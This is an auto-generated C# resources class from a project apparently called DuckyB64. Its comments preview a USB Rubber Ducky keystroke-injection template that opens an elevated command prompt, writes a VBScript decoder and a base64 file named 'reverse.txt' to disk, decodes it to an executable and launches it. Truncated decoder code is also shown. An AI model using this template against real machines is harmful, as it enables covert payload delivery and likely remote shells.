﻿//------------------------------------------------------------------------------
// <auto-generated>
//     This code was generated by a tool.
//     Runtime Version:4.0.30319.34209
//
//     Changes to this file may cause incorrect behavior and will be lost if
//     the code is regenerated.
// </auto-generated>
//------------------------------------------------------------------------------

namespace DuckyB64 {
    using System;
    
    
    /// <summary>
    ///   A strongly-typed resource class, for looking up localized strings, etc.
    /// </summary>
    // This class was auto-generated by the StronglyTypedResourceBuilder
    // class via a tool like ResGen or Visual Studio.
    // To add or remove a member, edit your .ResX file then rerun ResGen
    // with the /str option, or rebuild your VS project.
    [global::System.CodeDom.Compiler.GeneratedCodeAttribute("System.Resources.Tools.StronglyTypedResourceBuilder", "4.0.0.0")]
    [global::System.Diagnostics.DebuggerNonUserCodeAttribute()]
    [global::System.Runtime.CompilerServices.CompilerGeneratedAttribute()]
    internal class Resources {
        
        private static global::System.Resources.ResourceManager resourceMan;
        
        private static global::System.Globalization.CultureInfo resourceCulture;
        
        [global::System.Diagnostics.CodeAnalysis.SuppressMessageAttribute("Microsoft.Performance", "CA1811:AvoidUncalledPrivateCode")]
        internal Resources() {
        }
        
        /// <summary>
        ///   Returns the cached ResourceManager instance used by this class.
        /// </summary>
        [global::System.ComponentModel.EditorBrowsableAttribute(global::System.ComponentModel.EditorBrowsableState.Advanced)]
        internal static global::System.Resources.ResourceManager ResourceManager {
            get {
                if (object.ReferenceEquals(resourceMan, null)) {
                    global::System.Resources.ResourceManager temp = new global::System.Resources.ResourceManager("DuckyB64.Resources", typeof(Resources).Assembly);
                    resourceMan = temp;
                }
                return resourceMan;
            }
        }
        
        /// <summary>
        ///   Overrides the current thread's CurrentUICulture property for all
        ///   resource lookups using this strongly typed resource class.
        /// </summary>
        [global::System.ComponentModel.EditorBrowsableAttribute(global::System.ComponentModel.EditorBrowsableState.Advanced)]
        internal static global::System.Globalization.CultureInfo Culture {
            get {
                return resourceCulture;
            }
            set {
                resourceCulture = value;
            }
        }
        
        /// <summary>
        ///   Looks up a localized string similar to using System;
        ///using System.IO;
        ///using System.IO.Compression;
        ///namespace Base64ToExe
        ///{
        ///    class Program
        ///    {
        ///        static void Main(string[] args)
        ///        {
        ///            string s = args[0];
        ///            string d = args[1];
        ///            string base64 = File.ReadAllText(s);
        ///            byte[] bytes = Convert.FromBase64String(base64);
        ///            using (Stream compressedStream = new MemoryStream(bytes))
        ///            using (GZipStream zipStream = new GZipStream(compressedStream, CompressionMode.Decom [rest of string was truncated]&quot;;.
        /// </summary>
        internal static string Base64ToExe {
            get {
                return ResourceManager.GetString("Base64ToExe", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Looks up a localized string similar to DELAY 4000
        ///ESCAPE
        ///CONTROL ESCAPE
        ///DELAY 400
        ///STRING cmd
        ///DELAY 2000
        ///APP
        ///DELAY 400
        ///STRING a
        ///DELAY 600
        ///LEFTARROW
        ///ENTER
        ///DELAY 400
        ///STRING copy con c:\decoder.vbs
        ///ENTER
        ///{0}
        ///CTRL z
        ///ENTER
        ///STRING copy con c:\reverse.txt
        ///ENTER
        ///{1}
        ///CTRL z
        ///ENTER
        ///STRING cscript c:\decoder.vbs c:\reverse.txt c:\{2}
        ///ENTER
        ///STRING start c:\{2} {3}
        ///ENTER.
        /// </summary>
        internal static string DuckyB64Template {
            get {
                return ResourceManager.GetString("DuckyB64Template", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Looks up a localized string similar to Option Explicit:
        ///
        ///Dim arguments, inFile, outFile:
        ///
        ///Set arguments = WScript.Arguments:
        ///
        ///inFile = arguments(0):
        ///outFile = arguments(1):
        ///
        ///Dim base64Encoded, base64Decoded, outByteArray:
        ///
        ///dim objFS:
        ///dim objTS:
        ///
        ///set objFS = CreateObject(&quot;Scripting.FileSystemObject&quot;):
        ///set objTS = objFS.OpenTextFile(inFile, 1):
        ///
        ///base64Encoded = objTS.ReadAll:
        ///
        ///base64Decoded = decodeBase64(base64Encoded):
        ///
        ///dim gzip:
        ///set gzip = 
        ///
        ///Using compressedStream = New MemoryStream/(bytes):
        ///	Using zipStream = New GZipS [rest of string was truncated]&quot;;.
        /// </summary>
        internal static string VBScript {
            get {
                return ResourceManager.GetString("VBScript", resourceCulture);
            }
        }
    }
}